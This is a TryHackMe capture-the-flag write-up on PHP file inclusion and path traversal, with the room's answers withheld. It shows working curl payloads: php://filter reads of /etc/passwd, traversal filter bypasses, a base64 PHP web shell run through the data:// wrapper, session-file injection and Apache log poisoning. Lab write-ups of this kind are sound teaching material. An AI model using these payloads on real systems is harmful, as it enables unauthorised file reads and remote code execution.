# File Inclusion, Path Traversal (TryHackMe)

- **Path:** Web Application Pentesting > Advanced Server-Side Attacks (Premium).
- **Room:** File Inclusion, Path Traversal (~60 min) - LFI/RFI theory, PHP wrappers, base-directory
  breakouts, and three LFI->RCE routes (session files, log poisoning, wrapper RCE).
- **Date:** 2026-11-13.
- **Target:** `FilePath.v.1.4` @ `<ip>:80` (Apache/2.4.41, Ubuntu; PHP). Vulnerable endpoints:
  `playground.php`, `lfi.php`, `sessions.php` (all take a `page` GET param).
- **Method:** Driven headless over the THM VPN with `curl` (no AttackBox). RCE confirmed as
  `uid=33(www-data)`.
- **Status:** SOLVED - method below; **answers/flag left out on purpose so you solve it yourself.**

## Answers

| Task | Question | Answer |
|---|---|---|
| 3 | Pathing based on the current directory | *(find it yourself)* |
| 3 | Pathing from the root directory | *(find it yourself)* |
| 4 | PHP functionality for various data streams | *(find it yourself)* |
| 7 | Inject code into a log then include it | *(find it yourself)* |
| 8 | Content of the hidden file in the flags folder | `THM{…}` |

Tasks 1, 2, 5, 6, 9 need no answer (click-through / lab verification).

## Recon

`playground.php` serves a GET form with one field, `page` - the vulnerable inclusion sink:

```bash
T=<ip>
curl -s "http://$T/playground.php" | grep -i '<input'
# <input type="text" name="page" ... id="filePath" placeholder="Location">
```

## Task 3-4, 7 - theory

All four theory answers are stated plainly in the room text (the two pathing styles, the PHP feature
that exposes data streams, and the log-based injection technique). Read them off - the method below
shows each one in action so the term is obvious.

## Basic LFI + php://filter (read any file)

Confirm arbitrary file read by base64-encoding a target through the filter wrapper:

```bash
curl -s -G "http://$T/playground.php" \
  --data-urlencode "page=php://filter/convert.base64-encode/resource=/etc/passwd" \
  | grep -aoE "[A-Za-z0-9+/]{40,}={0,2}" | head -n1 | base64 -d
# root:x:0:0:root:/root:/bin/bash ...
```

- Path traversal to the same effect: `?page=../../../../etc/passwd`.
- **Base-directory breakout** (Task 5): when code requires the path to contain `/var/www/html` and
  blocks the literal `../..`, use `..//..//..//` - the doubled slashes collapse to one on the FS but
  don't match the blocked `../..` string: `page=/var/www/html/..//..//..//etc/passwd`.
- **Filter obfuscation bypasses**: URL-encode `%2e%2e%2f`, double-encode `%252e%252e%252f`, or the
  `....//` trick (survives a single `str_replace('../','')`).

## Task 8 - LFI -> RCE via the php://filter + data:// wrapper

The room's payload chains two wrappers: `php://filter/convert.base64-decode/resource=data://plain/text,<b64>`
where `<b64>` decodes to `<?php system($_GET['cmd']); echo 'Shell done !'; ?>`. The decode filter turns
the inline base64 data into live PHP, which the include then executes. Keep `&cmd=` OUT of the form
field (it would be encoded into the base64); on a raw curl you just append it as its own param.

```bash
B64='PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+'
rce(){ curl -s -G "http://$T/playground.php" \
  --data-urlencode "page=php://filter/convert.base64-decode/resource=data://plain/text,$B64" \
  --data-urlencode "cmd=$1" | sed 's/<[^>]*>//g'; }

rce "id"                                   # uid=33(www-data) gid=33(www-data) groups=...,27(sudo)
rce "ls -la /var/www/html/flags"           # a <hash>.txt file + index.html — that .txt is the target
rce "cat /var/www/html/flags/<hash>.txt"   # -> THM{…}
```

Cross-check without RCE (pure file read proves it too): base64-encode the same `.txt` through
`php://filter/convert.base64-encode/resource=...` and decode locally - it yields the identical flag.

(Nice tell: the flag body echoes the filename, so once `ls` shows the hidden `.txt`, you already know
the resource path to read.)

## Other LFI->RCE routes (demoed, not needed for the flag)

- **Session files (Task 6):** `sessions.php?page=<?php echo phpinfo(); ?>` stores the payload in
  `/var/lib/php/sessions/sess_<PHPSESSID>`; then `sessions.php?page=/var/lib/php/sessions/sess_<id>`
  (take `<id>` from the `PHPSESSID` cookie) includes and runs it.
- **Log poisoning (Task 7):** send `<?php system($_GET['c']); ?>` in the User-Agent (or a raw
  `nc $T 80` request line), then `?page=/var/log/apache2/access.log&c=id`.

## Lessons learned

- **The `data://` chain is the cleanest LFI->RCE** when `allow_url_include` is on: no upload, no log
  write, no session - the code is inline in the URL. `convert.base64-decode` sidesteps naive filters
  that would catch raw `<?php`.
- **One primitive, three escalations:** arbitrary file read becomes RCE via anything the server will
  later `include()` and that you can write to - your own session file, a log you can poison, or inline
  wrapper data.
- **`..//..//` beats a `../..` blocklist** because the filesystem collapses the double slash but the
  string filter doesn't; always try slash/encoding variants against path filters.
- **Prove the flag two ways** - the RCE `cat` and the `php://filter` read agreeing rules out a fluke.
- Related: [file-inclusion](file-inclusion.md) (Jr Pen Tester LFI/RFI room - same primitives),
  [advanced-server-side-attacks-ssrf](advanced-server-side-attacks-ssrf.md) (sibling module room).

## Reproduction notes

- No hostname needed - the box answers on its bare IP; `curl -G --data-urlencode` cleanly encodes the
  `+`/`/` in the base64 payload and the spaces in `cmd`.
- `allow_url_include` is effectively on (the `data://` wrapper executes).
